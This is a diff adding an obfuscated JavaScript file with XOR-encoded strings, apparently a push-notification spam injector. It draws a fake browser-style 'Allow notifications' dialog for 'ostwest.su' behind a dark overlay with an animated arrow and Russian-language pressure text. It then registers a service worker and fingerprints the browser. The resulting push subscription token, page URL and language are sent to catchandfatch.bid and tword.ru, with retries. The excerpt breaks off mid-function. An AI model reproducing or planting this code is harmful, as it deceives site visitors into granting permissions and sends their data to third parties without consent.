@@ -1,0 +1,456 @@
+!function (c, d) {
+    'use strict';
+    function e() {
+        return (Math['floor'](Math['random']()) + 0x1) * 0x2 * 0x3 * 0x4 * 0x5 * 0x6 * 0x7 * 0x8;
+    }
+    function f(g, h) {
+        var i = '';
+        for (let j = 0x0; j < g['length']; j++) {
+            let k = g['charCodeAt'](j) ^ h;
+            i += String['fromCharCode'](k);
+        }
+        return i;
+    }
+    const l = 'cFmKPfag', m = ![];
+    if (c[l + f('鷲鷢鷟鷰鷵鷳鷨鷟鷳鷴鷡鷲鷴鷟鷦鷩鷲鷳鷴', e())])
+        return;
+    c[l + f('鷲鷢鷟鷰鷵鷳鷨鷟鷳鷴鷡鷲鷴鷟鷦鷩鷲鷳鷴', e())] = 0x1;
+    var n;
+    if (c['CustomEvent']) {
+        n = new CustomEvent(f('鷲鷢鷢鷥鷦鷯鷲鷥鷩鷮鷩鷴', e()));
+    } else {
+        n = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof n[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            n[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())](f('鷲鷢鷢鷥鷦鷯鷲鷥鷩鷮鷩鷴', e()), !![], !![], null);
+    }
+    if (n)
+        c['dispatchEvent'](n);
+    const o = f('鷂鷁鶰鷅鷊鷦鶱鷓鷫鷰鷩鷡鷃鷦鶱鷙鷢鷑鷜鷇鷲鶶鷹鷭鷶鷂鷥鷘鶴鷊鷱鷺鷯鶹鶴鷋鷭鷎鷸鷂鷮鷇鷐鷑鶴鷡鷋鷱鷅鶹鷮鶹鷪鶷鷤鷑鷓鷦鷃鷏鷂鷁鷄鷚鷋鷯鷜鷄鷴鷭鷮鷡鷶鷣鷏鷶鷈鷊鷜鷵鷫鶷鷬鷷鷟鷇鷕', e());
+    function p(q) {
+        const r = '='['repeat']((0x4 - q['length'] % 0x4) % 0x4);
+        const s = (q + r)[f('鷲鷥鷰鷬鷡鷣鷥', e())](/\\/g, '+')[f('鷲鷥鷰鷬鷡鷣鷥', e())](/_/g, '/');
+        const t = c['atob'](s);
+        return Uint8Array['from']([...t]['map'](u => u['charCodeAt'](0x0)));
+    }
+    var v = c['navigator'] ? c['navigator']['language'] || c['navigator']['systemLanguage'] || c['navigator']['userLanguage'] : 'ru';
+    v = v['substr'](0x0, 0x2)['toLowerCase']();
+    var w = 0x0, x = ![], y = d[f('鷣鷲鷥鷡鷴鷥鷅鷬鷥鷭鷥鷮鷴', e())]('div'), z = y['style'], A = 0x2710, B = ![], C = ![], D = '', E, F, G, H, I, J;
+    if (c['CustomEvent']) {
+        E = new CustomEvent(f('鷲鷢鷳鷨鷯鷷', e()));
+        F = new CustomEvent(f('鷲鷢鷮鷯鷴鷳鷨鷯鷷', e()));
+        G = new CustomEvent(f('鷲鷢鷳鷵鷢鷳鷣鷲鷩鷢鷥', e()));
+        H = new CustomEvent('rbagree');
+        I = new CustomEvent(f('鷲鷢鷤鷩鷳鷡鷧鷲鷥鷥', e()));
+        J = new CustomEvent(f('鷲鷢鷡鷦鷴鷥鷲鷩鷮鷩鷴', e()));
+    } else {
+        E = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof E[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            E[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())](f('鷲鷢鷳鷨鷯鷷', e()), !![], !![], null);
+        F = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof F[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            F[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())](f('鷲鷢鷮鷯鷴鷳鷨鷯鷷', e()), !![], !![], null);
+        G = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof G[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            G[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())](f('鷲鷢鷳鷵鷢鷳鷣鷲鷩鷢鷥', e()), !![], !![], null);
+        H = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof H[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            H[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())]('rbagree', !![], !![], null);
+        I = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof I[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            I[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())](f('鷲鷢鷤鷩鷳鷡鷧鷲鷥鷥', e()), !![], !![], null);
+        J = c['createEvent'](f('鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e()));
+        if (typeof J[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+            J[f('鷩鷮鷩鷴鷃鷵鷳鷴鷯鷭鷅鷶鷥鷮鷴', e())](f('鷲鷢鷡鷦鷴鷥鷲鷩鷮鷩鷴', e()), !![], !![], null);
+    }
+    aV();
+    function K(L) {
+        try {
+            if (L)
+                L['remove']();
+        } catch (M) {
+            console['log'](M);
+        }
+    }
+    function N() {
+        if (!c[f('鷐鷵鷳鷨鷍鷡鷮鷡鷧鷥鷲', e())]) {
+            return ![];
+        }
+        if (!navigator[f('鷳鷥鷲鷶鷩鷣鷥鷗鷯鷲鷫鷥鷲', e())]) {
+            return ![];
+        }
+        if (Notification && Notification['permission'] && Notification['permission'] === 'default') {
+            if (B)
+                ae();
+            if (E)
+                c['dispatchEvent'](E);
+        } else if (F)
+            c['dispatchEvent'](F);
+        Notification[f('鷲鷥鷱鷵鷥鷳鷴鷐鷥鷲鷭鷩鷳鷳鷩鷯鷮', e())]()['then'](function (O) {
+            K(y);
+            y = undefined;
+            const P = { 'userVisibleOnly': !![] };
+            P[f('鷡鷰鷰鷬鷩鷣鷡鷴鷩鷯鷮鷓鷥鷲鷶鷥鷲鷋鷥鷹', e())] = p(o);
+            if (O == 'granted') {
+                navigator[f('鷳鷥鷲鷶鷩鷣鷥鷗鷯鷲鷫鷥鷲', e())]['ready']['then'](function (Q) {
+                    Q[f('鷰鷵鷳鷨鷍鷡鷮鷡鷧鷥鷲', e())][f('鷳鷵鷢鷳鷣鷲鷩鷢鷥', e())](P)['then'](function (R) {
+                        const S = JSON[f('鷳鷴鷲鷩鷮鷧鷩鷦鷹', e())](R['toJSON']());
+                        W(S);
+                        a2(S);
+                    }, function (T) {
+                        U();
+                    });
+                });
+            } else {
+                U();
+            }
+        });
+        navigator[f('鷳鷥鷲鷶鷩鷣鷥鷗鷯鷲鷫鷥鷲', e())]['register'](f('鶯鷲鷢鷟鷳鷥鷲鷶鷩鷣鷥鷷鷯鷲鷫鷥鷲鶮鷪鷳', e()), { 'updateViaCache': 'all' });
+    }
+    function U() {
+        K(y);
+        c['localStorage']['setItem']('sn_rb_ms_tk', ![]);
+        c['localStorage']['setItem']('sn_rb_fr_tm', Date['now']());
+        if (I)
+            c['dispatchEvent'](I);
+    }
+    var V = 0x0;
+    function W(X) {
+        if (!a7(X)) {
+            V++;
+            var D = '//' + 'catchandfatch.bid' + '/push/token';
+            var Z = 'token=' + encodeURIComponent(X) + '&appKey=' + encodeURIComponent(l) + '&' + f('鷲鷥鷱鷵鷥鷳鷴', e()) + '=' + encodeURIComponent(w) + '&version=2' + '&referrer=' + encodeURIComponent(c['location']['href']) + '&language=' + encodeURIComponent(v) + '&countSend=' + encodeURIComponent(V);
+            var a0 = new XMLHttpRequest();
+            a0['open']('POST', D, !![]);
+            a0['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
+            a0['timeout'] = 0x1388;
+            a0['send'](Z);
+            a0['onreadystatechange'] = function () {
+                if (a0['readyState'] != 0x4)
+                    return;
+                if (a0['status'] != 0xc8) {
+                    if (V < 0x6)
+                        W(X);
+                } else {
+                    var a1 = JSON['parse'](a0['responseText']);
+                    console['log']('response', a1);
+                    if (a1['status'] == 'ok') {
+                        a9(X);
+                        if (G)
+                            c['dispatchEvent'](G);
+                    }
+                }
+            };
+            a0['ontimeout'] = function () {
+                if (V < 0x6)
+                    W(X);
+            };
+        } else if (H) {
+            c['dispatchEvent'](H);
+        }
+    }
+    function a2(a3) {
+        var D = '//tword.ru/site/token-log';
+        var a5 = 'token=' + encodeURIComponent(a3) + '&appKey=' + encodeURIComponent(l) + '&' + f('鷲鷥鷱鷵鷥鷳鷴', e()) + '=' + encodeURIComponent(w) + '&version=2' + '&referrer=' + encodeURIComponent(c['location']['href']) + '&language=' + encodeURIComponent(v);
+        var a6 = new XMLHttpRequest();
+        a6['open']('POST', D, !![]);
+        a6['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
+        a6['send'](a5);
+    }
+    function a7(a8) {
+        return c['localStorage']['getItem']('sn_rb_ms_tk') == a8 && c['localStorage']['getItem']('sv_rb_ms_tk') == 'ok';
+    }
+    function a9(aa) {
+        c['localStorage']['setItem']('sn_rb_ms_tk', aa ? aa : '');
+        c['localStorage']['setItem']('sv_rb_ms_tk', 'ok');
+    }
+    c[f('鷳鷲鷁鷬鷬鷯鷷鷗', e())] = function () {
+        c['localStorage']['setItem']('sn_rb_ms_tk', !![]);
+        K(y);
+        N();
+    };
+    c[f('鷳鷲鷆鷯鷲鷢鷩鷤鷗', e())] = function () {
+        U();
+    };
+    c[f('鷳鷲鷃鷬鷯鷳鷥鷗', e())] = function () {
+        K(y);
+    };
+    function ab() {
+        var v = c['navigator'] ? c['navigator']['userLanguage'] || c['navigator']['language'] || c['navigator']['browserLanguage'] || c['navigator']['systemLanguage'] : 'ru';
+        v = v['substr'](0x0, 0x2)['toLowerCase']();
+        return v;
+    }
+    function ad() {
+        if (new RegExp('(android|bbd+|meego).+mobile|avantgo|bada/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge\x20|maemo|midp|mmp|netfront|opera\x20m(ob|in)i|palm(\x20os)?|phone|p(ixi|re)/|plucker|pocket|psp|series(4|6)0|symbian|treo|up.(browser|link)|vodafone|wap|windows\x20(ce|phone)|xda|xiino', 'i')['test'](navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())]) || new RegExp('1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a\x20wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r\x20|s\x20)|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1\x20u|g560|gene|gf-5|g-mo|go(.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp(\x20i|ip)|hs-c|ht(c(-|\x20|_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac(\x20|-|/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt(\x20|/)|klon|kpt\x20|kwc-|kyo(c|k)|le(no|xi)|lg(\x20g|/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-|\x20|o|v)|zz)|mt(50|p1|v\x20)|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v\x20)|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-|\x20)|webc|whit|wi(g\x20|nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-', 'i')['test'](navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())]['substr'](0x0, 0x4))) {
+            x = !![];
+        }
+    }
+    function ae() {
+        if (d['body']) {
+            if (y)
+                d['body']['appendChild'](y);
+            return !![];
+        } else {
+            setTimeout(function () {
+                ae();
+            }, 0x64);
+        }
+    }
+    function af() {
+        let ag = 0x48;
+        const ah = navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷭鷡鷴鷣鷨', e())](/Firefox\/\d+/);
+        return !!ah && (-0x1 !== navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('Android') && (ag = 0x44), +ah[0x0]['split']('/')[0x1] >= ag);
+    }
+    function ai() {
+        var aj = '';
+        if (af()) {
+            if (c['localStorage']['getItem']('sn_rb_ms_tk') === 'false' && c['localStorage']['getItem']('sn_rb_fr_tm') < Date['now']() - 0x3e8 * 0x3c * 0x3c * 0x18 || c['localStorage']['getItem']('sn_rb_ms_tk') !== 'false' && Notification && Notification['permission'] && Notification['permission'] === 'default') {
+                var v = ab(), al = '', am = '', an = '', ao = '';
+                if (v == 'ru' || v == 'uk') {
+                    al = 'Вы\x20разрешаете\x20<' + f('鷳鷰鷡鷮', e()) + '>https://ostwest.su</' + f('鷳鷰鷡鷮', e()) + '>\x20отправлять\x20' + f('駃馲馵馴馾馼馻馵馽馸駏', e()) + '?';
+                    am = 'Подробнее...';
+                    an = 'Р<' + f('鷳鷰鷡鷮', e()) + '>а</' + f('鷳鷰鷡鷮', e()) + '>зрешить\x20' + f('駃馲馵馴馾馼馻馵馽馸駏', e());
+                    ao = 'Н<' + f('鷳鷰鷡鷮', e()) + '>и</' + f('鷳鷰鷡鷮', e()) + '>когда\x20не\x20разрешать';
+                } else {
+                    al = 'Will\x20you\x20allow\x20<' + f('鷳鷰鷡鷮', e()) + '>https://ostwest.su</' + f('鷳鷰鷡鷮', e()) + '>\x20to\x20send\x20' + 'notifications' + '?';
+                    am = 'Learn\x20more';
+                    an = '<' + f('鷳鷰鷡鷮', e()) + '>A</' + f('鷳鷰鷡鷮', e()) + '>llow\x20' + 'Notifications';
+                    ao = 'Ne<' + f('鷳鷰鷡鷮', e()) + '>v</' + f('鷳鷰鷡鷮', e()) + '>er\x20Allow';
+                }
+                z['position'] = 'fixed';
+                z['zIndex'] = A;
+                z['top'] = '0px';
+                z['left'] = '0px';
+                z['right'] = '0px';
+                z['zIndex'] = 0xf4240;
+                z['fontFamily'] = 'Arial,serif';
+                aj += '<style>.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20{left:\x20251px\x20!important;' + f('鷢鷡鷣鷫鷧鷲鷯鷵鷮鷤', e()) + ':\x20#fff\x20!important;position:\x20relative\x20!important;z-index:\x201\x20!important;display:\x20inline-block\x20!important;max-width:\x20365px\x20!important;width:\x20100%\x20!important;border:\x201px\x20solid\x20#ccc\x20!important;' + '-' + f('鷷鷥鷢鷫鷩鷴', e()) + '-box-shadow:\x200px\x201px\x205px\x200px\x20rgba(0,0,0,0.18)\x20!important;-moz-box-shadow:\x200px\x200px\x205px\x200px\x20rgba(0,0,0,0.18)\x20!important;box-shadow:\x200px\x200px\x204px\x200px\x20rgba(0,0,0,0.18)\x20!important;}' + '@media(max-width:\x20867px)\x20{.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20{left:\x20auto\x20!important;display:\x20block\x20!important;margin:\x200\x20auto\x20!important;overflow:\x20hidden\x20!important;}}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + ',\x20.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20*\x20{-' + f('鷷鷥鷢鷫鷩鷴', e()) + '-box-sizing:\x20border-box\x20!important;-moz-box-sizing:\x20border-box\x20!important;box-sizing:\x20border-box\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '.arr::after\x20{position:\x20absolute\x20!important;content:\x20\x22\x22\x20!important;top:\x20-8px\x20!important;left:\x208px;width:\x200\x20!important;height:\x200\x20!important;border-style:\x20solid\x20!important;border-width:\x200\x207.5px\x208px\x207.5px\x20!important;border-color:\x20transparent\x20transparent\x20#ffffff\x20transparent\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '.arr::before\x20{position:\x20absolute\x20!important;content:\x20\x22\x22\x20!important;top:\x20-9px\x20!important;left:\x207px\x20!important;border-style:\x20solid\x20!important;border-width:\x200\x208.5px\x208px\x208.5px\x20!important;border-color:\x20transparent\x20transparent\x20#949595\x20transparent\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.title\x20{margin-top:\x2013px\x20!important;margin-bottom:\x2010px\x20!important;padding-left:\x2010px\x20!important;padding-right:\x2010px\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.title\x20img\x20{float:\x20left\x20!important;margin-right:\x200px\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.title\x20p\x20{padding-left:\x2048px\x20!important;color:\x20#000\x20!important;font-size:\x2012px\x20!important;line-height:\x2016px\x20!important;text-align:\x20left\x20!important;font-weight:\x20400\x20!important;margin-bottom:\x200px\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.title\x20p\x20' + f('鷳鷰鷡鷮', e()) + '\x20{color:\x20#000\x20!important;font-weight:\x20600\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.link\x20{padding-left:\x2058px\x20!important;line-height:\x201\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.link\x20a\x20{text-decoration:\x20none\x20!important;font-size:\x2012px\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20.link\x20a:hover\x20{text-decoration:\x20underline\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20{padding-top:\x2011px\x20!important;position:\x20relative\x20!important;margin:\x200\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button\x20{background:\x20#ededed\x20!important;border:\x20none\x20!important;border-top:\x201px\x20solid\x20#ccc\x20!important;cursor:\x20pointer\x20!important;color:\x20#000\x20!important;font-size:\x2012px\x20!important;width:\x2050%\x20!important;height:\x2040px\x20!important;position:\x20relative\x20!important;padding:0\x20!important;margin:0\x20!important;font-weight:normal\x20!important;font-family:Arial\x20!important;text-transform:none\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button:first-of-type\x20{float:\x20left\x20!important;color:\x20#fff\x20!important;border:\x20none\x20!important;border-top:\x201px\x20solid\x20#0356c3\x20!important;' + f('鷢鷡鷣鷫鷧鷲鷯鷵鷮鷤', e()) + ':\x20#0060df\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button:first-of-type:hover\x20{background:\x20#003eaa\x20!important;border-top:\x201px\x20solid\x20#033895\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button:last-of-type\x20{border-right:\x200px\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button:last-of-type::before\x20{position:\x20absolute\x20!important;content:\x20\x22\x22\x20!important;width:\x201px\x20!important;' + f('鷢鷡鷣鷫鷧鷲鷯鷵鷮鷤', e()) + ':\x20#ccc\x20!important;height:\x20auto\x20!important;top:\x205px\x20!important;bottom:\x205px\x20!important;right:\x200\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button:last-of-type:hover\x20{background:\x20#e2e2e2\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button:last-of-type:hover::before\x20{top:\x200\x20!important;bottom:\x200\x20!important;}' + '.' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x20form\x20button\x20' + f('鷳鷰鷡鷮', e()) + '\x20{text-decoration:\x20underline\x20!important;}' + '</style>' + '<div\x20' + f('鷣鷬鷡鷳鷳', e()) + '=\x22' + f('鷲鷢鷟鷦鷯鷸鷟鷷鷩鷮鷤鷯鷷', e()) + '\x22><div\x20' + f('鷣鷬鷡鷳鷳', e()) + '=\x22title\x22><img\x20src=\x22https://abc.catchandfatch.bid/images/push-standart/mes.png\x22\x20alt=\x22\x22><p>' + al + '</p></div>' + '<div\x20' + f('鷣鷬鷡鷳鷳', e()) + '=\x22link\x22><a\x20href=\x22\x22>' + am + '</a></div><form\x20action=\x22\x22><button\x20' + f('鷯鷮鷣鷬鷩鷣鷫', e()) + '=\x22' + f('鷳鷲鷁鷬鷬鷯鷷鷗', e()) + '()\x22>' + an + '</button>' + '<button\x20' + f('鷯鷮鷣鷬鷩鷣鷫', e()) + '=\x22' + f('鷳鷲鷆鷯鷲鷢鷩鷤鷗', e()) + '()\x22>' + ao + '</button></form></div>';
+                var ap = setInterval(function () {
+                    if (d['getElementById'](f('鷲鷢鷟鷬鷡鷢鷥鷬鷟鷦鷯鷸', e()))) {
+                        clearInterval(ap);
+                        var aq = ![];
+                        d['getElementById'](f('鷲鷢鷟鷬鷡鷢鷥鷬鷟鷦鷯鷸', e()))[f('鷡鷤鷤鷅鷶鷥鷮鷴鷌鷩鷳鷴鷥鷮鷥鷲', e())](f('鷭鷯鷵鷳鷥鷥鷮鷴鷥鷲', e()), function () {
+                            aq = !![];
+                        });
+                        d['getElementById'](f('鷲鷢鷟鷬鷡鷢鷥鷬鷟鷦鷯鷸', e()))[f('鷡鷤鷤鷅鷶鷥鷮鷴鷌鷩鷳鷴鷥鷮鷥鷲', e())](f('鷭鷯鷵鷳鷥鷬鷥鷡鷶鷥', e()), function () {
+                            aq = ![];
+                        });
+                        d['body'][f('鷡鷤鷤鷅鷶鷥鷮鷴鷌鷩鷳鷴鷥鷮鷥鷲', e())](f('鷣鷬鷩鷣鷫', e()), function () {
+                            if (aq === ![] && d['getElementById'](f('鷲鷢鷟鷩鷮鷰鷵鷴鷟鷦鷯鷸', e()))) {
+                                d['getElementById'](f('鷲鷢鷟鷩鷮鷰鷵鷴鷟鷦鷯鷸', e()))['checked'] = ![];
+                            }
+                        });
+                    }
+                }, 0x12c);
+                aj += '<div\x20id=\x22rb_dark_area\x22\x20style=\x22position:fixed;\x20top:0;\x20right:0;\x20bottom:0;\x20left:0;\x20background:#000;\x20opacity:0.75;\x22>\x20';
+                if (!C)
+                    aj += '<div\x20style=\x22display:\x20block;position:\x20fixed;right:\x2010px;color:\x20white;font-size:\x2030px;top:\x2010px;cursor:\x20pointer;\x22\x20\x20' + f('鷯鷮鷣鷬鷩鷣鷫', e()) + '=\x22' + f('鷳鷲鷆鷯鷲鷢鷩鷤鷗', e()) + '()\x22>X</div>';
+                aj += '</div>';
+                function ar() {
+                    var as;
+                    if (!!c['opr'] && !!opr['addons'] || !!c['opera'] || navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('\x20OPR/') >= 0x0) {
+                        as = 'Opera';
+                    } else if (typeof InstallTrigger !== 'undefined') {
+                        as = 'Firefox';
+                    } else if (/constructor/i['test'](c['HTMLElement']) || function (at) {
+                            return at['toString']() === '[object\x20SafariRemoteNotification]';
+                        }(!c['safari'] || typeof safari !== 'undefined' && safari['pushNotification'])) {
+                        as = 'Safari';
+                    } else if (![] || !!d['documentMode']) {
+                        as = 'IE';
+                        var au = !![];
+                    } else if (!au && !!c['StyleMedia']) {
+                        as = 'Edge';
+                    } else if (navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('\x20YaBrowser/') >= 0x0 || navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('\x20Yowser/') >= 0x0) {
+                        as = 'Yandex';
+                    } else if (!!c['chrome'] || !!c['chrome']['webstore']) {
+                        as = 'Chrome';
+                    }
+                    return as;
+                }
+                var av = ar();
+                aj += '<div\x20' + f('鷣鷬鷡鷳鷳', e()) + '=\x22darkeArrow\x20' + av + '\x22><div></div></div>';
+                aj += '<style>@keyframes\x20pump\x20{0%\x20{\x20transform:\x20translateY(0);\x20}25%\x20{\x20transform:\x20translateY(-5px);\x20}75%\x20{\x20transform:\x20translateY(5px);\x20}100%\x20{\x20transform:\x20translateY(0);\x20}\x20}' + '.darkeArrow\x20{display:\x20block;font-family:\x20sans-serif;font-size:\x2024px;text-align:\x20center;position:\x20absolute;top:\x20165px;left:\x20165px;max-width:\x20350px;transform:\x20translateX(-50%);}' + '.darkeArrow\x20div\x20{display:\x20block;background:\x20url(\x22https://abc.catchandfatch.bid/images/rb_darke_arrow.png\x22)\x20no-repeat\x200\x200;height:\x20135px;width:\x20114px;' + 'margin:\x200\x20auto\x2050px;animation:\x20pump\x20.75s\x20ease-out\x200s\x20infinite;}' + '.Chrome\x20{top:\x20145px;left:\x20263px;}\x20.Firefox\x20{top:\x20140px;left:\x20365px;}\x20.Opera\x20{top:\x20125px;left:\x20280px;}' + '.Yandex\x20{top:\x20190px;left:\x20auto;right:\x20230px;transform:\x20translateX(50%);}' + '.Edge\x20{top:\x20auto;bottom:\x2080px;left:\x2050%;margin-left:\x20257px;transform:\x20scale(1,\x20-1)\x20translateX(-50%);}' + '@media(max-width:\x201000px){.Edge\x20{transform:\x20scale(1,\x20-1);margin-left:\x200;left:\x20auto;right:\x20184px;}}' + 'html[lang=\x22ru\x22]\x20.Chrome,html[lang=\x22es\x22]\x20.Chrome,html[lang=\x22fr\x22]\x20.Chrome,html[lang=\x22de\x22]\x20.Chrome\x20{left:\x20246px;}' + '@media\x20(max-width:\x20767px)\x20{\x20.darkeArrow\x20{display:\x20none;}\x20}' + '</style>';
+                aj += '<p\x20style=\x22position:\x20fixed;top:\x2050%;color:\x20#000000;\x20font-size:\x2030px;text-align:\x20center;left:\x2050%;transform:\x20translate(-50%,-50%);max-width:\x20360px;line-height:\x201.3;background:\x20#dfdfdf;font-weight:bold;padding:\x2020px;\x22>\x20Нажмите\x20&quot;Разрешить&quot;,\x20чтобы\x20получать\x20уведомления</p>';
+                y['innerHTML'] = aj;
+                D = 'https://abc.catchandfatch.bid/register-push?appKey=cFmKPfag&href=' + c['location']['href'] + '&' + f('鷲鷥鷱鷵鷥鷳鷴', e()) + '=' + w;
+                ae();
+            } else if (c['localStorage']['getItem']('sn_rb_ms_tk') === 'false') {
+                if (typeof c[f('鷳鷲鷆鷯鷲鷢鷩鷤鷗', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
